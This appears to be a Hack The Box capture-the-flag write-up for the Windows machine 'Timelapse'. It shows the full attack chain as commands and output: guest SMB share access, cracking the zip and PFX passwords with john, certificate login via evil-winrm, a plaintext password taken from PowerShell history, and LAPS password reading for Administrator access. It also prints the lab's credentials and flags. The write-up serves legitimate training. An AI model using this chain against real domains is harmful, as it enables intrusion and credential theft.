---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - PFX
  - OpenSSL
  - LAPS_Reader
---
# Overview

| Name        | Timelapse |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- 10.129.222.65
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 04:46 CDT
Nmap scan report for 10.129.222.65
Host is up (0.077s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-10-18 17:49:05Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-10-18T17:50:34+00:00; +8h00m00s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-18T17:49:58
|_  start_date: N/A
```
# Initial Foothold

```bash
$ nxc smb 10.129.222.65 -u 'guest' -p '' --shares
SMB         10.129.222.65   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.222.65   445    DC01             [+] timelapse.htb\guest: 
SMB         10.129.222.65   445    DC01             [*] Enumerated shares
SMB         10.129.222.65   445    DC01             Share           Permissions     Remark
SMB         10.129.222.65   445    DC01             -----           -----------     ------
SMB         10.129.222.65   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.222.65   445    DC01             C$                              Default share
SMB         10.129.222.65   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.222.65   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.222.65   445    DC01             Shares          READ            
SMB         10.129.222.65   445    DC01             SYSVOL                          Logon server share 
```

```bash
$ smbclient //10.129.222.65/Shares -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

		6367231 blocks of size 4096. 1226872 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 14:40:06 2021
  ..                                  D        0  Mon Oct 25 14:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021

		6367231 blocks of size 4096. 1224878 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (8.1 KiloBytes/sec) (average 8.1 KiloBytes/sec)
smb: \Dev\> exit
```

```bash
$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

```bash
zip2john winrm_backup.zip > winrm.hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash
```

We get pass `supremelegacy` unzip it.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-10-18 04:59) 2.631g/s 9140Kp/s 9140Kc/s 9140KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx  
```

```bash
pfx2john legacyy_dev_auth.pfx > legacy.hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt legacy.hash
```

We get password `thuglegacy`. Extract the private key.

```bash
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out time.key
Enter Import Password: thuglegacy
Enter PEM pass phrase: 123456789
Verifying - Enter PEM pass phrase: 123456789
```

Enter Import Password: `thuglegacy`
Enter PEM pass phrase: `123456789` (or create your own)

Extract Certificate from PFX

```bash
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out time.crt
Enter Import Password: thuglegacy
```

Decrypt the private key now:

```bash
$ openssl rsa -in time.key -out time-decrypted.key
Enter pass phrase for time.key: 123456789
writing RSA key
```

```bash
$ evil-winrm -i 10.129.222.65 -k time-decrypted.key -S -c time.crt

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
82f631d643c45fda8ca18158e5bf160d
```
# Privilege Escalation

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX
```

Then check for user directories and PowerShell history of that each user.

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy> foreach($user in ((ls C:\Users).Name)){cat "C:\Users\$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

We find:

**Username:** `svc_deploy`  
**Password:** `E3R$Q62^12p7PLlC%KWaxuaV`

```bash
$ evil-winrm -i 10.129.222.65 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

The `-S` flag enables SSL connection (since we're connecting to port 5986).

You should see that `svc_deploy` is a member of `LAPS_Readers` group.  Being part of this group means that we are able to read the password (**ms-mcs-admpwd**) of the local Administrator.

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Domain Controllers/DC01
Certificates                         : {}
CN                                   : DC01
codePage                             : 0
CompoundIdentitySupported            : {False}
countryCode                          : 0
Created                              : 10/23/2021 11:40:55 AM
createTimeStamp                      : 10/23/2021 11:40:55 AM
Deleted                              :
Description                          :
DisplayName                          :
DistinguishedName                    : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                          : dc01.timelapse.htb
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 9:03:33 AM, 10/25/2021 9:03:33 AM, 10/23/2021 11:40:55 AM, 1/1/1601 10:16:33 AM}
Enabled                              : True
HomedirRequired                      : False
HomePage                             :
instanceType                         : 4
IPv4Address                          : 10.129.222.65
IPv6Address                          : dead:beef::29d0:31b5:ab66:e14f
isCriticalSystemObject               : True
isDeleted                            :
KerberosEncryptionType               : {RC4, AES128, AES256}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 134052831063244009
LastLogonDate                        : 10/18/2025 10:45:03 AM
lastLogonTimestamp                   : 134052831032775230
localPolicyFlags                     : 0
Location                             :
LockedOut                            : False
logonCount                           : 156
ManagedBy                            :
MemberOf                             : {}
MNSLogonAccount                      : False
Modified                             : 10/18/2025 10:45:38 AM
modifyTimeStamp                      : 10/18/2025 10:45:38 AM
ms-Mcs-AdmPwd                        : ,8ud6o7@{7Pl0po%p-)9q,z)
<SNIP>
```

**Administrator Password:** `,8ud6o7@{7Pl0po%p-)9q,z)`

```bash
$ evil-winrm -i 10.129.222.65 -u Administrator -p ',8ud6o7@{7Pl0po%p-)9q,z)' -S

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Flag is in TRX desktop.

```powershell
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


*Evil-WinRM* PS C:\Users> cd TRX
*Evil-WinRM* PS C:\Users\TRX> ls


    Directory: C:\Users\TRX


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         3/3/2022  10:45 PM                3D Objects
d-r---         3/3/2022  10:45 PM                Contacts
d-r---         3/3/2022  10:45 PM                Desktop
d-r---         3/3/2022  10:45 PM                Documents
d-r---         3/3/2022  10:45 PM                Downloads
d-r---         3/3/2022  10:45 PM                Favorites
d-r---         3/3/2022  10:45 PM                Links
d-r---         3/3/2022  10:45 PM                Music
d-r---         3/3/2022  10:45 PM                Pictures
d-r---         3/3/2022  10:45 PM                Saved Games
d-r---         3/3/2022  10:45 PM                Searches
d-r---         3/3/2022  10:45 PM                Videos


*Evil-WinRM* PS C:\Users\TRX> cd Desktop
*Evil-WinRM* PS C:\Users\TRX\Desktop> cat root.txt
8bec007e413aec606ccc080ac0e533da
```

---
